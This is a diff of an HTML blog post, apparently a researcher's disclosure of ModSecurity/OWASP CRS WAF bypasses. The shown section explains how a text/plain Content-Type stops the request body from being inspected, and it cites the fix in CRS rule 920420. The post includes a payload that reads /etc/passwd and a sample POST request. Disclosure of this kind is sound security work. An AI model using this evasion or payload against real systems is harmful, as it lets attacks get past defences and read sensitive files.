-<h3 id="complete-request-body-bypass">Complete Request Body Bypass</h3>
-<p>This one deserves a special mention as it probably is the most interesting of all the findings that I stumbled upon.</p>
-<p>When reading up documentation and source code of how ModSecurity activates inspection of rules, I found that ModSecurity employs specific body processors based upon the identified <code>Content-Type</code> header. These processors are designed to understand and break down the request body into a usable structure for rule evaluation.</p>
-<p>The JSON and XML parsers are dynamically activated by rules within the ModSecurity configuration, typically the <code>ctl:requestBodyProcessor</code> action within a <code>SecRule</code> matching the corresponding <code>Content-Type</code> header.</p>
-<p>The parsers supported by the WAF engine are:</p>
+
+
+
+
+<h3 id="complete-request-body-bypass">
+  <a href="#complete-request-body-bypass" class="anchor" aria-label="Anchor link for: Complete Request Body Bypass">
+    Complete Request Body Bypass
+  </a>
+</h3>
+<p>This one is definitely worth highlighting as it is probably the most interesting finding that I had stumbled upon.</p>
+<p>While digging through the documentation and source code to understand how ModSecurity decides which rules to activate, I stumbled upon something interesting: ModSecurity uses specific body processors based on what <code>Content-Type</code> header it detects. These processors are basically designed to take the request body and break it down into something the rules can actually work with.</p>
+<p>The JSON and XML parsers get turned on dynamically by rules in the ModSecurity config, usually through the <code>ctl:requestBodyProcessor</code> action within a <code>SecRule</code> that matches the right <code>Content-Type</code> header.</p>
+<p>Here are the parsers that the WAF engine can handle:</p>
 <ul>
-<li><code>application/x-www-form-urlencoded</code>: The default behavior for forms. ModSecurity parses this into the <code>ARGS</code> (arguments) variables, accessible to rules.</li>
-<li><code>multipart/form-data</code>: Used for file uploads. This is a more complex format requiring specialized parsing to differentiate between form fields and uploaded files.</li>
-<li><code>application/json</code>: Engages the JSON parser.</li>
-<li><code>(text|application)/xml</code>: Engages the XML parser.</li>
+<li><code>application/x-www-form-urlencoded</code>: This is the standard for regular forms. ModSecurity takes this and breaks it down into <code>ARGS</code> (arguments) variables that the rules can access.</li>
+<li><code>multipart/form-data</code>: Used when you&rsquo;re uploading files. This one&rsquo;s a bit more complicated since it needs special parsing to tell the difference between regular form fields and the actual uploaded files.</li>
+<li><code>application/json</code>: This triggers the JSON parser.</li>
+<li><code>(text|application)/xml</code>: This triggers the XML parser.</li>
 </ul>
-<p>This clicked something in my head &ndash; what about backends do not rely on the <code>Content-Type</code> header to process requests? What happens when I use <code>text/plain</code>? To my surprise, it worked. Payloads as simple as <code>cat ../../etc/passwd</code> (which will easily get detected at PL1) went through the WAF completely unchecked.</p>
+<p>This got me thinking &ndash; what about backends that do not rely on the <code>Content-Type</code> header to process requests? What happens when I use <code>text/plain</code>? To my surprise, it actually worked. Payloads as simple as <code>cat ../../etc/passwd</code> (which will easily get detected at PL1) sailed right through the WAF completely unchecked.</p>
 
     <img src="meme.jpg"  alt="meme"  class="center"  style="max-width: 450px; height: auto;"  />
 
@@ -393,7 +490,7 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">942390</span> PL2 SQL Injection Attack
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">942521</span> PL2 Detects basic SQL authentication bypass attempts <span style="color:#ae81ff">4.1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">942522</span> PL2 Detects basic SQL authentication bypass attempts <span style="color:#ae81ff">4.1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>
-</span></span></code></pre></div><p>If the backend of the application does not rely on the <code>Content-Type</code> request header value and it decodes the request body anyway, ModSecurity will fall back to the default request body parser leading to the following bypass with the <code>Content-Type</code> header set to <code>text/plain</code>.</p>
+</span></span></code></pre></div><p>If you set the <code>Content-Type</code> header to <code>text/plain</code> and the backend doesn&rsquo;t bother checking the header and just goes ahead and decodes the request body anyway, ModSecurity will fall back to its default request body parser. This allows you to slip in any payload within the request.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">POST</span> <span style="color:#960050;background-color:#1e0010">/login</span> <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host:</span> <span style="color:#960050;background-color:#1e0010">api.example.com</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">text/plain</span>
@@ -413,15 +510,23 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># WAF, leading to a bypass. To avoid bypasses, you must enable the appropriate</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># body parser based on the expected data in the request bodies (For example</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># JSON for JSON data, XML for XML data, etc).</span>
-</span></span></code></pre></div><p>CRS now detects such non-standard content-types via:</p>
+</span></span></code></pre></div><p>The WAF now properly detects and flags such non-standard content-types via:</p>
 <ul>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf#L935"><code>920420</code></a> - Request content type is not allowed by policy</li>
 </ul>
-<h2 id="credits-where-its-due">Credits Where Its Due</h2>
+
+
+
+
+<h2 id="credits-where-its-due">
+  <a href="#credits-where-its-due" class="anchor" aria-label="Anchor link for: Credits Where Its Due">
+    Credits Where Its Due
+  </a>
+</h2>
 <p>ModSecurity and the OWASP Core Rule Set (CRS) are invaluable contributions to the open-source community.</p>
-<p>I would like to extend my appreciation to their maintainers for their continued support of such a critical security project.
-My thanks also go to <a href="https://x.com/intigriti">Intigriti</a> and the <a href="https://x.com/theparanoids">@TheParanoids</a> team at Yahoo for organizing the hacking event and for the kind invitation to participate.</p>
-<p>That’s all folks. Thank you for reading! Cheers! 🥂</p>
+<p>I want to give a huge shoutout to their maintainers for keeping such a critical security project alive and well.
+I also extend my gratitude to <a href="https://x.com/intigriti">Intigriti</a> and the <a href="https://x.com/theparanoids">@TheParanoids</a> team at Yahoo for organizing the hacking event and for the kind invitation to participate.</p>
+<p>That’s all folks. Thanks for sticking with me through this! Cheers! 🥂</p>
 
       </div>
     </article>
@@ -440,7 +545,7 @@ My thanks also go to <a href="https://x.com/intigriti">Intigriti</a> and the <a 
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        2409 Words
+        2556 Words
       </p>
 
       <p>
